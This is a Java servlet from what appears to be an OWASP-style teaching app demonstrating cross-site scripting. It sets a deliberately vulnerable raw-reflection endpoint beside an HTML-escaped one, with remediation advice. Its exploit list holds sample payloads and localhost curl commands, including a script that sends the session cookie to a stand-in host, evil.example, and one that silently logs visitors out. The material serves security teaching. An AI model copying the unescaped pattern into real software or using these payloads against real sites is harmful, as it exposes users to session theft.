package com.owasp.demo.controller;

import com.owasp.demo.view.TemplateEngine;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

import java.io.IOException;

public class XssHandler implements IRouteHandler {

    @Override
    public void handle(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String path = req.getPathInfo();

        if ("POST".equals(req.getMethod()) && "/xss/vulnerable".equals(path)) {
            handleVulnerable(req, res);
        } else if ("POST".equals(req.getMethod()) && "/xss/mitigated".equals(path)) {
            handleMitigated(req, res);
        } else {
            renderPage(res, null, null, null, null);
        }
    }

    private void handleVulnerable(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String input = req.getParameter("comment");
        renderPage(res, input, input, null, null);
    }

    private void handleMitigated(HttpServletRequest req, HttpServletResponse res) throws IOException {
        String input = req.getParameter("comment2");
        renderPage(res, null, null, input, TemplateEngine.escape(input));
    }

    private void renderPage(HttpServletResponse res,
                            String vulnInput, String vulnOutput,
                            String safeInput, String safeOutput) throws IOException {
        String info = TemplateEngine.infoBox(
            "The application reflects user input directly into the HTML response without encoding. " +
            "An attacker can inject <code>&lt;script&gt;</code> tags or event handlers that execute " +
            "in the victim's browser, stealing cookies or performing actions on their behalf.",
            "Always HTML-encode user input before rendering it in a page. Use " +
            "<code>HtmlUtils.htmlEscape()</code> or equivalent. Apply a strict Content-Security-Policy " +
            "header to block inline script execution as a defence-in-depth measure."
        );

        String xssPayload = "<script>alert('XSS')</script>";

        String vulnForm = """
            <form method="POST" action="/xss/vulnerable" class="space-y-3">
              <label class="block text-sm font-medium text-gray-700">Post a comment</label>
              <input type="text" name="comment"
                placeholder='Try: %s'
                value="%s"
                class="w-full border border-gray-300 rounded px-3 py-2 text-sm"/>
              <button class="bg-red-600 text-white px-4 py-2 rounded text-sm hover:bg-red-700">Submit (Vulnerable)</button>
            </form>
            %s
            """.formatted(
                TemplateEngine.escape(xssPayload),
                TemplateEngine.escape(vulnInput != null ? vulnInput : ""),
                vulnOutput != null
                    ? "<div class='mt-3 p-3 bg-red-50 border border-red-200 rounded text-sm'><strong>Rendered output:</strong><br/>" + vulnOutput + "</div>"
                    : ""
            );

        String safeForm = """
            <form method="POST" action="/xss/mitigated" class="space-y-3">
              <label class="block text-sm font-medium text-gray-700">Post a comment</label>
              <input type="text" name="comment2"
                placeholder='Try: %s'
                value="%s"
                class="w-full border border-gray-300 rounded px-3 py-2 text-sm"/>
              <button class="bg-green-600 text-white px-4 py-2 rounded text-sm hover:bg-green-700">Submit (Safe)</button>
            </form>
            %s
            """.formatted(
                TemplateEngine.escape(xssPayload),
                TemplateEngine.escape(safeInput != null ? safeInput : ""),
                safeOutput != null
                    ? "<div class='mt-3 p-3 bg-green-50 border border-green-200 rounded text-sm'><strong>Rendered output (escaped):</strong><br/>" + safeOutput + "</div>"
                    : ""
            );

        String panels = """
            <div class="grid md:grid-cols-2 gap-6">
              %s
              %s
            </div>
            """.formatted(
                TemplateEngine.demoPanel("Vulnerable — Raw Reflection", "red", vulnForm, ""),
                TemplateEngine.demoPanel("Mitigated — HTML Encoding", "green", safeForm, "")
            );

        String exploits = TemplateEngine.exploitBox(new String[][]{
            {"Basic alert", "<script>alert('XSS')</script>",
             "Classic proof-of-concept — pops an alert box in the victim's browser.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>alert('XSS')</script>\""},
            {"Cookie theft", "<script>document.location='http://evil.example/steal?c='+document.cookie</script>",
             "Exfiltrates the session cookie to an attacker-controlled server.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>document.location='http://evil.example/steal?c='+document.cookie</script>\""},
            {"DOM manipulation", "<img src=x onerror=\"document.body.style.background='red'\">",
             "Uses an invalid src to trigger onerror, then alters the page DOM.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode 'comment=<img src=x onerror=alert(1)>'"},
            {"Stored payload", "<script>fetch('/logout')</script>",
             "Silently logs out any visitor who views the comment — a stored XSS action.", "comment",
             "curl -s -X POST http://localhost:8090/xss/vulnerable -b 'JSESSIONID=SESSION' --data-urlencode \"comment=<script>fetch('/logout')</script>\""},
        });

        String content = TemplateEngine.vulnerabilityBadge("A03", "Injection — Cross-Site Scripting (XSS)") + info + exploits + panels;
        res.getWriter().write(TemplateEngine.page("XSS", content, true));
    }
}
